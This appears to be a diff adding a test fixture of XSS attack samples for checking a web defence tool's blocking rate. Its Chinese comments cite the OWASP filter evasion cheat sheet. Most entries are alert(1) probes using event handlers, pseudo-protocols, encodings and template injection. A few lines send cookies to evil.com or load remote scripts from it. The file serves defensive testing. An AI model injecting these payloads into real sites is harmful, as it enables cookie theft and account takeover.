@@ -1,0 +1,92 @@
+# XSS 攻击样本
+# 来源: OWASP XSS Filter Evasion Cheat Sheet + 公开 payload 数据集
+# 期望: 所有样本均应被防御工具拦截（拦截率 >= 98%）
+
+# ---- 基础脚本标签 ----
+<script>alert('xss')</script>
+<script>alert(document.cookie)</script>
+<script>document.location='http://evil.com?c='+document.cookie</script>
+<ScRiPt>alert(1)</ScRiPt>
+<script >alert(1)</script >
+<scr<script>ipt>alert(1)</scr<script>ipt>
+
+# ---- 事件处理器 ----
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<img src=1 onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<body onload=alert('xss')>
+<a href="javascript:alert(1)">click me</a>
+<a href=javascript:alert(1)>click</a>
+<input onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<button onclick=alert(1)>click</button>
+<svg onload=alert(1)>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<iframe onload=alert(1)>
+
+# ---- 伪协议 ----
+javascript:alert(1)
+javascript:alert(document.cookie)
+java\u0000script:alert(1)
+java\tscript:alert(1)
+java\nscript:alert(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+vbscript:msgbox(1)
+mocha:[code]
+livescript:[code]
+
+# ---- 编码绕过 ----
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;/&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert(1)&#x3C;/&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
+\x3cscript\x3ealert(1)\x3c/script\x3e
+\u003cscript\u003ealert(1)\u003c/script\u003e
+
+# ---- HTML5 向量 ----
+<svg><script>alert&#40;1&#41;</script></svg>
+<math><mtext></mtext><script>alert(1)</script></math>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<form><button formaction="javascript:alert(1)">X</button></form>
+<isindex type=image src=1 onerror=alert(1)>
+
+# ---- 基于 DOM 的 XSS ----
+#' onclick=alert(1)//
+#' onmouseover=alert(1)//
+<img src="x" onerror="alert(1)">
+<img src=`x` onerror="alert(1)">
+<img src="jav&#x09;ascript:alert(1)">
+
+# ---- 过滤绕过技巧 ----
+<scr%00ipt>alert(1)</scr%00ipt>
+<script/src="http://evil.com/xss.js"></script>
+<script src=//evil.com/xss.js></script>
+<<script>alert(1);//<</script>
+<img src="x" onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+
+# ---- Angular / Vue / React 模板注入 ----
+{{constructor.constructor('alert(1)')()}}
+{{_openBlock.constructor('alert(1)')()}}
+${alert(1)}
+#{alert(1)}
+<%= alert(1) %>
+
+# ---- 基于样式 ----
+<style>@import 'javascript:alert(1)';</style>
+<style>body{background-image: url("javascript:alert(1)")}</style>
+
+# ---- 使用 Unicode 和特殊字符 ----
+<ſcript>alert(1)</ſcript>
+<scrİpt>alert(1)</scrİpt>
+<scriscriptpt>alert(1)</scriscriptpt>
+<scri%00pt>alert(1)</scri%00pt>
+
+# ---- 利用解析差异 ----
+<title><img src=x onerror=alert(1)></title>
+<noscript><img src=x onerror=alert(1)></noscript>
+<plaintext><script>alert(1)</script>
+<xmp><script>alert(1)</script></xmp>
